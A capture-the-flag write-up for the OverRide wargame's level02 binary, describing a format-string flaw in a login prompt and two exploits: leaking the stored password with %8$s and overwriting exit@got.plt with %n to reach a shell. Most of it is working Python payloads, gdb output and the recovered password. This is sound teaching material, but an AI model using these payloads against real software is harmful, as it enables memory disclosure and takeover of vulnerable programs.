# level02
## Program behaviour

1. Read the `content` of `/home/users/level03/.pass`
2. Ask for `username`
3. Ask for `password`
4. Test `password` equal to `content`
    - if equal, run `/bin/sh`
    - if not, `printf(username); puts(" does not have access !"); exit(1)`

## Vulnerability

The `username` is directly passed as format string to `printf`.
This is vunerable to `printf` attacks.

## Exploitation

### Method 1: Dump the `content` using `%s`

1. Print pointers with `username` as format string
    - `password` begins at `%8$p`
```sh
level02@OverRide:~$ (python -c 'print "%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p\n" + "\x40\xe5\xff\xff\xff\x7f"') | ~/level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4d0 (nil) 0x40 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6c8 0x1f7ff9a08 0x7fffffffe540 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) does not have access!
```

2. Use the address of `content` as a string with `%s`
```sh
level02@OverRide:~$ (python -c 'print "%8$s\n" + "\x40\xe5\xff\xff\xff\x7f"') | ~/level02 ===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H does not have access!
```

### Method 2: Overwrite `exit@got.plt`

1. Find the required addresses
    - `0x601228`: address to overwrite
    - `0x400a85`: address to jump to (`4196997` in decimal)
```gdb
(gdb) disas 0x400710
Dump of assembler code for function exit@plt:
   0x0000000000400710 <+0>:	jmpq   *0x200b12(%rip)      # 0x601228 <exit@got.plt>
   0x0000000000400716 <+6>:	pushq  $0xa
   0x000000000040071b <+11>:	jmpq   0x400660
End of assembler dump.
(gdb) x/10i main+625
   0x400a85 <main+625>:	mov    $0x400d32,%edi           # Address to jump to
   0x400a8a <main+630>:	callq  0x4006b0 <system@plt>
   0x400a8f <main+635>:	mov    $0x0,%eax
   0x400a94 <main+640>:	leaveq 
   0x400a95 <main+641>:	retq   
   0x400a96 <main+642>:	lea    -0x70(%rbp),%rax
   0x400a9a <main+646>:	mov    %rax,%rdi
   0x400a9d <main+649>:	mov    $0x0,%eax
   0x400aa2 <main+654>:	callq  0x4006c0 <printf@plt>
   0x400aa7 <main+659>:	mov    $0x400d3a,%edi
```

2. Use `%n` to write to arbitrary locations
```sh
level02@OverRide:~$ (python -c 'print "%4196997x%8$n\n" + "\x28\x12\x60\n"'; cat) | ~/level02

*lots of spaces*

cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```